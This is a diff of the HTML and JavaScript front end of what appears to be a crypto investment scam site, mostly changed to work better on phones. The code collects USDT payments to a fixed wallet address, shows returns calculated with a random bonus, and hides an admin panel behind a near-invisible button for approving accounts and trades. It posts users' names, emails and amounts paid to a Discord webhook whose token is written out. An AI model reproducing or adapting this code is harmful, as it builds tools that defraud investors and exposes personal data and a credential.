-            <div class="bg-black/50 p-2 rounded-2xl inline-block mx-auto mb-6 border border-white/10 shadow-lg">
-                <!-- USDT INVESTMENT IMAGE -->
-                <img src="https://cdn.corenexis.com/f/tdjcXcerUz1.png" alt="USDT QR Code" class="w-48 rounded-lg">
+    <!-- DEPLOYMENT MODAL -->
+    <div id="deploy-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[100] hidden items-center justify-center p-4 pt-safe pb-safe">
+        <div class="glass-panel p-8 max-w-md w-full relative text-center border-[#00F0FF]/20 shadow-[0_0_50px_rgba(0,240,255,0.2)] max-h-[85vh] overflow-y-auto">
+            <button onclick="closeDeploymentModal()" class="absolute top-4 right-5 text-slate-400 hover:text-white text-2xl font-bold p-2">✕</button>
+            <h3 class="text-2xl font-bold uppercase tracking-widest text-white mb-3 mt-4">Fund Trade</h3>
+            <p id="deploy-desc" class="text-slate-400 text-sm mb-6 font-mono leading-relaxed"></p>
+            <div class="bg-black/50 p-3 rounded-2xl inline-block mx-auto mb-6 border border-white/10 shadow-lg">
+                <img src="https://cdn.corenexis.com/f/tdjcXcerUz1.png" alt="USDT QR Code" class="w-40 rounded-lg">
             </div>
-            
             <p class="text-xs text-[#00FF00] uppercase tracking-widest mb-2 font-bold" id="deploy-amount-text">Send exact USDT (TRC20)</p>
-            <div class="cyber-input text-xs text-cyan-400 font-bold select-all bg-black/70 mb-8 font-mono text-center tracking-wider">TB3P7nnBjjWWSfrqy182hrsP15w7YXVQ1Q</div>
-            
-            <button id="deploy-btn-submit" onclick="finalizeTradeDeployment()" class="cyber-btn">I Have Sent The Trade Funds</button>
+            <div class="cyber-input text-xs sm:text-sm text-cyan-400 font-bold select-all bg-black/70 mb-8 font-mono text-center tracking-wider break-all p-3">TB3P7nnBjjWWSfrqy182hrsP15w7YXVQ1Q</div>
+            <button id="deploy-btn-submit" onclick="finalizeTradeDeployment()" class="cyber-btn py-4">I Have Sent Funds</button>
         </div>
     </div>
 
-    <!-- NEW TRADE PENDING OVERLAY MODAL WITH CUSTOM MESSAGE -->
-    <div id="trade-pending-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[150] hidden items-center justify-center p-4">
-        <div class="glass-panel p-8 max-w-lg w-full relative text-center border-[#00F0FF]/20 shadow-[0_0_50px_rgba(0,240,255,0.2)] flex flex-col items-center">
-            <div class="w-16 h-16 border-4 border-[#00F0FF] border-t-transparent rounded-full animate-spin mb-6 shadow-[0_0_30px_rgba(0,240,255,0.3)]"></div>
-            
-            <h3 class="text-3xl font-bold uppercase tracking-widest text-white mb-6">Trade Recorded</h3>
-            
-            <!-- DETAILED SUPPORT NOTICE -->
-            <div class="bg-black/50 border border-white/10 rounded-xl p-5 mb-8 text-left text-[13px] font-mono text-slate-300 space-y-3 shadow-inner">
-                <p class="text-[#FF003C] font-bold text-center border-b border-white/10 pb-2 mb-2">⚠️ FIRST DAYS INITIALIZATION NOTICE</p>
+    <!-- TRADE PENDING MODAL -->
+    <div id="trade-pending-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[150] hidden items-center justify-center p-4 pt-safe pb-safe">
+        <div class="glass-panel p-6 sm:p-8 max-w-lg w-full relative text-center border-[#00F0FF]/20 shadow-[0_0_50px_rgba(0,240,255,0.2)] flex flex-col items-center max-h-[90vh] overflow-y-auto">
+            <div class="w-14 h-14 border-4 border-[#00F0FF] border-t-transparent rounded-full animate-spin mb-6 shadow-[0_0_30px_rgba(0,240,255,0.3)] mt-2"></div>
+            <h3 class="text-2xl sm:text-3xl font-bold uppercase tracking-widest text-white mb-6">Trade Recorded</h3>
+            <div class="bg-black/50 border border-white/10 rounded-xl p-5 mb-8 text-left text-sm font-mono text-slate-300 space-y-3 shadow-inner">
+                <p class="text-[#FF003C] font-bold text-center border-b border-white/10 pb-2 mb-2">⚠️ INITIALIZATION NOTICE</p>
                 <p>Note that in the first days you may not be able to re-login into the account and live actions may not work.</p>
-                <p>• If you haven't paid the monthly subscription and the subscription hasn't been activated, then the money will be completely given back.</p>
-                <p>• Else, you can press the <b class="text-[#A020F0]">SUPPORT</b> button below and describe the problem. We will then recontact you and you can tell us to subtract the $15 subscription fee from the money given to proceed (this needs to be done in less than 2 days).</p>
-                <p class="text-[#00F0FF] border-t border-white/10 pt-3 mt-3">The team will now send you an email from the support address (nexustrading@gmail.com) to confirm the transaction (if you sent money) and to establish the times.</p>
+                <p>• If you haven't paid the monthly subscription, the money will be completely given back.</p>
+                <p>• Else, you can press the <b class="text-[#A020F0]">SUPPORT</b> button below and describe the problem. We will then recontact you and you can tell us to subtract the $15 subscription fee from the money given to proceed.</p>
+                <p class="text-[#00F0FF] border-t border-white/10 pt-3 mt-3">The team will now send you an email from the support address (nexustrading@gmail.com) to confirm the transaction.</p>
             </div>
-            
             <div class="flex flex-col sm:flex-row gap-4 w-full">
-                <button onclick="closeTradePendingScreen(); openSupportModal();" class="cyber-btn flex-1 !bg-gradient-to-r !from-[#A020F0] !to-purple-600 text-white">Contact Support</button>
-                <button onclick="closeTradePendingScreen()" class="cyber-btn flex-1 bg-gradient-to-r from-slate-600 to-slate-800 text-white border border-slate-500">Dashboard</button>
+                <button onclick="closeTradePendingScreen(); openSupportModal();" class="cyber-btn py-4 flex-1 !bg-gradient-to-r !from-[#A020F0] !to-purple-600 text-white">Support</button>
+                <button onclick="closeTradePendingScreen()" class="cyber-btn py-4 flex-1 bg-gradient-to-r from-slate-600 to-slate-800 text-white border border-slate-500">Dashboard</button>
             </div>
         </div>
     </div>
 
-    <!-- NEW UNIVERSAL SUPPORT MODAL -->
-    <div id="support-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[300] hidden items-center justify-center p-4">
-        <div class="glass-panel p-10 max-w-md w-full relative border-[#A020F0]/30 shadow-[0_0_50px_rgba(160,32,240,0.25)]">
-            <button onclick="closeSupportModal()" class="absolute top-4 right-5 text-slate-400 hover:text-white text-xl font-bold">✕</button>
-            
-            <h3 class="text-2xl font-bold uppercase tracking-widest text-white mb-2 text-center text-transparent bg-clip-text bg-gradient-to-r from-[#A020F0] to-[#00F0FF]">Contact Support</h3>
-            <p class="text-slate-400 text-xs mb-6 font-mono text-center uppercase">Secure Ticketing System</p>
-            
-            <div class="space-y-4">
+    <!-- UNIVERSAL SUPPORT MODAL -->
+    <div id="support-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[300] hidden items-center justify-center p-4 pt-safe pb-safe">
+        <div class="glass-panel p-8 max-w-md w-full relative border-[#A020F0]/30 shadow-[0_0_50px_rgba(160,32,240,0.25)] max-h-[85vh] overflow-y-auto">
+            <button onclick="closeSupportModal()" class="absolute top-4 right-5 text-slate-400 hover:text-white text-2xl font-bold p-2">✕</button>
+            <h3 class="text-2xl font-bold uppercase tracking-widest text-white mb-2 mt-4 text-center text-transparent bg-clip-text bg-gradient-to-r from-[#A020F0] to-[#00F0FF]">Contact Support</h3>
+            <p class="text-slate-400 text-xs mb-8 font-mono text-center uppercase">Secure Ticketing System</p>
+            <div class="space-y-5">
                 <input type="email" id="sup-email" class="cyber-input border-[#A020F0]/40 focus:border-[#A020F0]" placeholder="YOUR EMAIL ADDRESS">
                 <input type="text" id="sup-title" class="cyber-input border-[#A020F0]/40 focus:border-[#A020F0]" placeholder="TICKET TITLE">
-                <textarea id="sup-obj" rows="4" class="cyber-input border-[#A020F0]/40 focus:border-[#A020F0] resize-none" placeholder="DESCRIBE YOUR ISSUE/OBJECT..."></textarea>
-                <button onclick="submitSupportTicket()" class="cyber-btn !bg-gradient-to-r !from-[#A020F0] !to-purple-600 mt-4 border-none text-white shadow-[0_0_15px_rgba(160,32,240,0.4)]">Send to Support</button>
+                <textarea id="sup-obj" rows="5" class="cyber-input border-[#A020F0]/40 focus:border-[#A020F0] resize-none" placeholder="DESCRIBE YOUR ISSUE/OBJECT..."></textarea>
+                <button onclick="submitSupportTicket()" class="cyber-btn py-4 !bg-gradient-to-r !from-[#A020F0] !to-purple-600 mt-2 border-none text-white shadow-[0_0_15px_rgba(160,32,240,0.4)]">Send to Support</button>
             </div>
         </div>
     </div>
 
     <!-- HIDDEN OVERRIDE TRIGGER BUTTON -->
-    <div onclick="openAdminPanel()" class="fixed bottom-4 right-4 text-white/5 hover:text-white/40 cursor-pointer p-4 z-[100] transition">
+    <div onclick="openAdminPanel()" class="fixed bottom-[80px] md:bottom-4 right-4 text-white/5 hover:text-white/40 cursor-pointer p-4 z-[100] transition">
         <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
     </div>
 
     <!-- OVERRIDE COMMAND PANEL CONTROL UNIT -->
-    <div id="admin-panel" class="fixed inset-0 bg-[#020204]/95 backdrop-blur-md z-[200] hidden flex-col p-8 overflow-y-auto">
+    <div id="admin-panel" class="fixed inset-0 bg-[#020204]/95 backdrop-blur-md z-[400] hidden flex-col p-4 sm:p-8 overflow-y-auto pt-safe pb-safe">
         <div class="max-w-7xl w-full mx-auto">
-            <div class="flex justify-between items-center border-b border-purple-500/30 pb-6 mb-8">
-                <h1 class="text-3xl font-bold text-purple-400 uppercase tracking-widest">Admin Control Module</h1>
-                <button onclick="closeAdminPanel()" class="border border-white/20 px-6 py-2 hover:bg-white/10 text-xs font-bold uppercase tracking-wider font-mono">Exit Terminal</button>
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center border-b border-purple-500/30 pb-4 sm:pb-6 mb-6 sm:mb-8 gap-4 mt-6 sm:mt-0">
+                <h1 class="text-2xl sm:text-3xl font-bold text-purple-400 uppercase tracking-widest">Admin Control Module</h1>
+                <button onclick="closeAdminPanel()" class="border border-white/20 px-6 py-3 hover:bg-white/10 text-xs font-bold uppercase tracking-wider font-mono">Exit Terminal</button>
             </div>
 
-            <div class="glass-panel p-6 border-yellow-500/30 bg-black/60 mb-8">
+            <div class="glass-panel p-5 sm:p-6 border-yellow-500/30 bg-black/60 mb-6 sm:mb-8">
                 <h3 class="font-bold text-yellow-500 mb-4 text-lg uppercase tracking-wider">Pending Investment Approvals</h3>
-                <p class="text-xs text-slate-500 mb-4 uppercase font-mono">Review and authorize deployed capital from nodes.</p>
                 <div id="admin-trades" class="space-y-4 font-mono text-sm max-h-[350px] overflow-y-auto pr-2"></div>
             </div>
 
-            <div class="grid md:grid-cols-2 gap-8">
-                <div class="glass-panel p-6 border-purple-500/20 bg-black/60">
+            <div class="grid md:grid-cols-2 gap-6 sm:gap-8">
+                <div class="glass-panel p-5 sm:p-6 border-purple-500/20 bg-black/60">
                     <h3 class="font-bold text-purple-400 mb-6 text-lg uppercase tracking-wider">Node Authorizations</h3>
-                    <p class="text-xs text-slate-500 mb-4 uppercase font-mono">Instantly force approval on any profile configuration status.</p>
-                    <div id="admin-users" class="space-y-4 font-mono text-sm max-h-[500px] overflow-y-auto pr-2"></div>
+                    <div id="admin-users" class="space-y-4 font-mono text-sm max-h-[60vh] md:max-h-[500px] overflow-y-auto pr-2"></div>
                 </div>
             </div>
         </div>
@@ -491,9 +501,6 @@
         }
         syncFirebaseUsers();
 
-        // ==================================================
-        // DISCORD WEBHOOK INTEGRATION
-        // ==================================================
         function sendDiscordWebhook(content) {
             const webhookUrl = "https://discord.com/api/webhooks/1525563329106673784/bUBnmdphHmY8LvyBQ7Tz7OVvzFRWeYLRWDYP3Ahky1p2b1v5Yt0pOm8tf-TBhp1C1FLc";
             fetch(webhookUrl, {
@@ -511,7 +518,8 @@
             width = canvas.width = window.innerWidth;
             height = canvas.height = window.innerHeight;
             particles = [];
-            for(let i=0; i<65; i++) {
+            let particleCount = window.innerWidth < 768 ? 30 : 65; 
+            for(let i=0; i<particleCount; i++) {
                 particles.push({
                     x: Math.random() * width, y: Math.random() * height,
                     vx: (Math.random() - 0.5) * 0.7, vy: (Math.random() - 0.5) * 0.7,
@@ -570,7 +578,7 @@
 
             } catch(e) {
                 loadStaticFallback();
-                apiBadge.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-[#FF003C] animate-pulse"></span> STATIC BACKUP (API LIMITED)';
+                apiBadge.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-[#FF003C] animate-pulse"></span> STATIC BACKUP';
                 apiBadge.classList.replace('text-[#00F0FF]', 'text-[#FF003C]');
                 apiBadge.classList.replace('bg-[#00F0FF]/10', 'bg-[#FF003C]/10');
                 apiBadge.classList.replace('border-[#00F0FF]/30', 'border-[#FF003C]/30');
@@ -605,11 +613,9 @@
         }
 
         // ==================================================
-        // NAVIGATION LOCK HANDLER
+        // NAVIGATION HANDLER
         // ==================================================
         function navTo(viewId) {
-            
-            // STRICT VALIDATION: Block access to Trading Dashboard without full activation
             if (viewId === 'view-dashboard') {
                 if (!activeUser || activeUser.status !== 'approved') {
                     alert("ACCESS DENIED: You must create an account and click 'I Have Sent The Funds' on the Subscription Registration step to access the Trading Dashboard.");
@@ -620,13 +626,22 @@
             document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
             document.getElementById(viewId).classList.add('active');
 
+            // Reset Mobile Nav State
+            document.querySelectorAll('.mobile-nav-btn').forEach(btn => {
+                btn.classList.replace('text-[#00F0FF]', 'text-slate-500');
+            });
+
             if(viewId === 'view-dashboard') {
                 document.getElementById('nav-dash').classList.replace('text-slate-500', 'text-[#00F0FF]');
                 document.getElementById('nav-faq').classList.replace('text-[#00F0FF]', 'text-slate-500');
+                if(document.getElementById('mobile-nav-dash')) document.getElementById('mobile-nav-dash').classList.replace('text-slate-500', 'text-[#00F0FF]');
                 renderCoinGrid(); 
+                window.scrollTo(0, 0); 
             } else if (viewId === 'view-faq') {
                 document.getElementById('nav-faq').classList.replace('text-slate-500', 'text-[#00F0FF]');
                 document.getElementById('nav-dash').classList.replace('text-[#00F0FF]', 'text-slate-500');
+                if(document.getElementById('mobile-nav-faq')) document.getElementById('mobile-nav-faq').classList.replace('text-slate-500', 'text-[#00F0FF]');
+                window.scrollTo(0, 0);
             }
         }
 
@@ -645,8 +660,15 @@
         window.executeLogout = function() {
             activeUser = null;
             document.getElementById('user-nav').classList.add('hidden');
-            document.getElementById('status-badge').innerText = "ACCOUNT LOCKED";
-            document.getElementById('status-badge').className = "text-[11px] font-mono px-3 py-1.5 border border-[#FF003C]/40 text-[#FF003C] bg-[#FF003C]/10 uppercase font-bold shadow-[0_0_12px_rgba(255,0,60,0.15)]";
+            
+            const mobileNav = document.getElementById('mobile-nav');
+            if(mobileNav) {
+                mobileNav.classList.remove('flex');
+                mobileNav.classList.add('hidden');
+            }
+
+            document.getElementById('status-badge').innerText = "LOCKED";
+            document.getElementById('status-badge').className = "text-xs font-mono px-3 py-1.5 border border-[#FF003C]/40 text-[#FF003C] bg-[#FF003C]/10 uppercase font-bold shadow-[0_0_12px_rgba(255,0,60,0.15)] flex-shrink-0 text-center";
             navTo('view-auth');
         };
 
@@ -703,24 +725,30 @@
         function checkStatus() {
             if(!activeUser) return;
             const badge = document.getElementById('status-badge');
+            const mobileNav = document.getElementById('mobile-nav');
             
             if(activeUser.status === 'unauthorized') {
                 navTo('view-sub');
-                badge.innerText = "ACCOUNT LOCKED";
-                badge.className = "text-[11px] font-mono px-3 py-1.5 rounded border border-red-500/50 text-red-400 bg-red-500/10 uppercase font-bold";
+                badge.innerText = "LOCKED";
+                badge.className = "text-xs font-mono px-3 py-1.5 rounded border border-red-500/50 text-red-400 bg-red-500/10 uppercase font-bold flex-shrink-0 text-center";
+                if(mobileNav) {
+                    mobileNav.classList.remove('flex');
+                    mobileNav.classList.add('hidden');
+                }
             } else if (activeUser.status === 'approved') {
-                badge.innerText = "ACCOUNT UNLOCKED";
-                badge.className = "text-[11px] font-mono px-3 py-1.5 rounded border border-[#00F0FF]/50 text-[#00F0FF] bg-[#00F0FF]/10 uppercase font-bold shadow-[0_0_15px_rgba(0,240,255,0.25)]";
+                badge.innerText = "UNLOCKED";
+                badge.className = "text-xs font-mono px-3 py-1.5 rounded border border-[#00F0FF]/50 text-[#00F0FF] bg-[#00F0FF]/10 uppercase font-bold shadow-[0_0_15px_rgba(0,240,255,0.25)] flex-shrink-0 text-center";
+                
+                if(mobileNav) {
+                    mobileNav.classList.remove('hidden');
+                    mobileNav.classList.add('flex');
+                }
                 navTo('view-dashboard');
             }
         }
 
-        // ==================================================
-        // INSTANT BYPASS FUNCTION
-        // ==================================================
         window.submitPayment = function() {
             if(!activeUser) { alert("Session expired."); return; }
-            
             sendDiscordWebhook(`🚨 **New Account Activated**\n**Username:** ${activeUser.username}\n**Email:** ${activeUser.email}`);
             
             activeUser.status = 'approved';
@@ -730,9 +758,6 @@
             updateAdminPanel();
         };
 
-        // ==================================================
-        // LATE SUBSCRIPTION MODAL CONTROLLERS
-        // ==================================================
         window.openLateSubModal = function() {
             document.getElementById('late-sub-modal').classList.remove('hidden');
             document.getElementById('late-sub-modal').classList.add('flex');
@@ -746,9 +771,7 @@
         window.submitLateSub = function() {
             const username = activeUser ? activeUser.username : "Unregistered User";
             const email = activeUser ? activeUser.email : "Unknown Email";
-            
             sendDiscordWebhook(`💸 **Late Subscription Paid**\n**Username:** ${username}\n**Email:** ${email}`);
-            
             alert("Thank you. Your subscription payment is being verified in the background.");
             closeLateSubModal();
         };
@@ -759,7 +782,6 @@
                     const docSnap = await db.collection('users').doc(activeUser.docId).get();
                     if(docSnap.exists) {
                         const data = docSnap.data();
-                        
                         if (data.status !== activeUser.status && activeUser.status !== 'approved') {
                             activeUser.status = data.status;
                             checkStatus();
@@ -771,8 +793,8 @@
 
         function switchMarketTab(tab) {
             currentMarketTab = tab;
-            document.getElementById('tab-pop').className = `flex-1 py-4 font-bold text-md transition uppercase tracking-wider ${tab==='pop'?'text-[#00F0FF] border-b-2 border-[#00F0FF] bg-white/5':'text-slate-500 border-b-2 border-transparent hover:text-white'}`;
-            document.getElementById('tab-vol').className = `flex-1 py-4 font-bold text-md transition uppercase tracking-wider ${tab==='vol'?'text-[#00F0FF] border-b-2 border-[#00F0FF] bg-white/5':'text-slate-500 border-b-2 border-transparent hover:text-white'}`;
+            document.getElementById('tab-pop').className = `flex-1 py-4 font-bold text-sm sm:text-md transition uppercase tracking-wider ${tab==='pop'?'text-[#00F0FF] border-b-2 border-[#00F0FF] bg-white/5':'text-slate-500 border-b-2 border-transparent hover:text-white'}`;
+            document.getElementById('tab-vol').className = `flex-1 py-4 font-bold text-sm sm:text-md transition uppercase tracking-wider ${tab==='vol'?'text-[#00F0FF] border-b-2 border-[#00F0FF] bg-white/5':'text-slate-500 border-b-2 border-transparent hover:text-white'}`;
             renderCoinGrid();
         }
 
@@ -797,8 +819,8 @@
                 };
 
                 cardDiv.innerHTML = `
-                    <img src="${coin.image}" class="w-11 h-11 rounded-full mb-3 pointer-events-none shadow-md">
-                    <div class="font-bold text-lg uppercase mb-1 pointer-events-none truncate w-full tracking-wider text-white">${coin.symbol}</div>
+                    <img src="${coin.image}" class="w-10 h-10 sm:w-11 sm:h-11 rounded-full mb-3 pointer-events-none shadow-md">
+                    <div class="font-bold text-base sm:text-lg uppercase mb-1 pointer-events-none truncate w-full tracking-wider text-white">${coin.symbol}</div>
                     <div class="text-xs text-slate-400 font-mono mb-3 pointer-events-none truncate w-full">$${pForm}</div>
                     <div class="text-[11px] font-bold ${color} bg-black/70 px-2.5 py-1 rounded font-mono border border-white/10 pointer-events-none tracking-wide">
                         ${sign}${coin.change.toFixed(2)}%
@@ -824,9 +846,14 @@
             const isPos = selectedCoin.change >= 0;
             const changeEl = document.getElementById('calc-change');
             changeEl.innerText = `${isPos ? '+' : ''}${selectedCoin.change.toFixed(2)}%`;
-            changeEl.className = `font-bold font-mono text-base ${isPos ? 'text-[#00FF00]' : 'text-[#FF003C]'}`;
+            changeEl.className = `font-bold font-mono text-sm sm:text-base ${isPos ? 'text-[#00FF00]' : 'text-[#FF003C]'}`;
 
             runMathCalculations();
+            
+            // Auto-scroll to top (calculator) on mobile
+            if(window.innerWidth < 1024) {
+               window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
         };
 
         window.runMathCalculations = function() {
@@ -839,7 +866,6 @@
             const varianceRate = Math.abs(selectedCoin.change || 0);
             const grossGains = budget * (varianceRate / 100);
             const executionCut = grossGains * 0.05; 
-            
             const randomBonus = (Math.random() * 5) + 3;
             const netYield = budget + (grossGains - executionCut) + randomBonus;
 
@@ -864,12 +890,8 @@
             modal.classList.add('hidden'); modal.classList.remove('flex');
         };
 
-        // ==================================================
-        // NEW INVESTMENT TRANSFER DISPATCH
-        // ==================================================
         window.finalizeTradeDeployment = function() {
             const amount = parseFloat(document.getElementById('invest-slider').value);
-            
             sendDiscordWebhook(`💸 **New Trade Invested**\n**Username:** ${activeUser.username}\n**Email:** ${activeUser.email}\n**Money Spent:** $${amount}`);
             
             const varianceRate = Math.abs(selectedCoin.change || 0);
@@ -904,9 +926,6 @@
             document.getElementById('trade-pending-modal').classList.remove('flex');
         };
 
-        // ==================================================
-        // SUPPORT TICKETING SYSTEM
-        // ==================================================
         window.openSupportModal = function() {
             document.getElementById('support-modal').classList.remove('hidden');
             document.getElementById('support-modal').classList.add('flex');
@@ -930,11 +949,10 @@
                 return;
             }
 
-            const username = activeUser ? activeUser.username : "Unregistered / Logged Out User";
-            const webhookPayload = `🛠️ **New Support Ticket**\n**Username:** ${username}\n**Email:** ${email}\n**Title:** ${title}\n**Object/Message:**\n${msg}`;
+            const username = activeUser ? activeUser.username : "Unregistered User";
+            const webhookPayload = `🛠️ **New Support Ticket**\n**Username:** ${username}\n**Email:** ${email}\n**Title:** ${title}\n**Message:**\n${msg}`;
 
             sendDiscordWebhook(webhookPayload);
-
             alert("Ticket Submitted Successfully. The team will contact you shortly.");
             closeSupportModal();
             
@@ -963,16 +981,16 @@
             roster.innerHTML = DB.users.map(u => {
                 let controlButton = '';
                 if(u.status !== 'approved') {
-                    controlButton = `<button onclick="forceAuthorizeTargetNode('${u.docId}')" class="cyber-btn-danger px-4 py-2 text-xs font-bold rounded">FORCE AUTHORIZE</button>`;
+                    controlButton = `<button onclick="forceAuthorizeTargetNode('${u.docId}')" class="cyber-btn-danger px-4 py-3 text-xs font-bold rounded mt-3 sm:mt-0 w-full sm:w-auto">FORCE AUTH</button>`;
                 } else {
-                    controlButton = `<span class="text-[#00F0FF] font-bold text-xs bg-white/5 px-3 py-1 rounded border border-[#00F0FF]/20">NODE SYSTEM ACTIVE</span>`;
+                    controlButton = `<span class="text-[#00F0FF] font-bold text-xs bg-white/5 px-3 py-2 rounded border border-[#00F0FF]/20 mt-3 sm:mt-0 inline-block w-full sm:w-auto text-center">NODE ACTIVE</span>`;
                 }
 
                 return `
-                <div class="bg-black/70 border border-white/10 p-4 rounded-xl flex justify-between items-center shadow-lg mb-3">
-                    <div>
+                <div class="bg-black/70 border border-white/10 p-4 sm:p-5 rounded-xl flex flex-col sm:flex-row justify-between sm:items-center shadow-lg mb-4">
+                    <div class="mb-2 sm:mb-0">
                         <div class="text-white font-bold text-lg uppercase tracking-wide">${u.username}</div>
-                        <div class="text-[11px] text-slate-400 font-mono mt-1 uppercase">State: ${u.status} | Email: ${u.email}</div>
+                        <div class="text-xs text-slate-400 font-mono mt-1 uppercase truncate">State: ${u.status} | Email: ${u.email}</div>
                     </div>
                     ${controlButton}
                 </div>`;
@@ -984,17 +1002,17 @@
                 if(u.pending_investments && u.pending_investments.length > 0) {
                     u.pending_investments.forEach((trade, index) => {
                         tradesHTML += `
-                        <div class="bg-black/70 border border-yellow-500/30 p-4 rounded-xl flex justify-between items-center shadow-lg mb-3">
-                            <div>
-                                <div class="text-yellow-400 font-bold text-md uppercase tracking-wide">${u.username} <span class="text-white text-xs mx-1">REQUESTS</span> ${trade.coinSymbol}</div>
-                                <div class="text-[11px] text-slate-400 font-mono mt-1 uppercase">Budget: $${trade.amount} | Expected Yield Route: $${trade.expectedYield.toFixed(2)}</div>
+                        <div class="bg-black/70 border border-yellow-500/30 p-4 sm:p-5 rounded-xl flex flex-col sm:flex-row justify-between sm:items-center shadow-lg mb-4">
+                            <div class="mb-3 sm:mb-0">
+                                <div class="text-yellow-400 font-bold text-md uppercase tracking-wide">${u.username} <span class="text-white text-[10px] mx-1">REQ</span> ${trade.coinSymbol}</div>
+                                <div class="text-xs text-slate-400 font-mono mt-1 uppercase">Budget: $${trade.amount} | Yield Route: $${trade.expectedYield.toFixed(2)}</div>
                             </div>
-                            <button onclick="approveAdminTrade('${u.docId}', ${index})" class="cyber-btn-success px-4 py-2 text-xs font-bold rounded">APPROVE TRADE</button>
+                            <button onclick="approveAdminTrade('${u.docId}', ${index})" class="cyber-btn-success px-4 py-3 text-xs font-bold rounded w-full sm:w-auto">APPROVE</button>
                         </div>`;
                     });
                 }
             });
-            if(tradesHTML === '') tradesHTML = `<div class="text-slate-500 text-xs font-mono uppercase">No pending network trades requiring authorization.</div>`;
+            if(tradesHTML === '') tradesHTML = `<div class="text-slate-500 text-xs font-mono uppercase">No pending network trades.</div>`;
             tradesList.innerHTML = tradesHTML;
         }
 
